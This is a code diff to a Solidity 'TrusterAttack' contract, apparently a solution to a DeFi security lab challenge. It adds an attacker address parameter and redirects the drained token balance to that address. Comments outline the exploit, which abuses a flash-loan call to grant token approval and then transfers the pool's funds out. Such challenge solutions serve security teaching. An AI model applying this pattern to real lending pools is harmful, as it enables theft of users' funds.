@@ -17,7 +17,9 @@ contract TrusterAttack {
   
     constructor(address payable poolAddress,
                  
-                address tokenAddress)
+                address tokenAddress,
+                address attackerAddress
+                )
     {
         //Idea
 
@@ -34,7 +36,7 @@ contract TrusterAttack {
                 balance
             )
         );
-        IERC20(tokenAddress).transfer(msg.sender, balance);
+        IERC20(tokenAddress).transfer(attackerAddress, balance);
         //calldata = approve(pool, this)
         //response 
         //token.tranfser(amount,attacker)
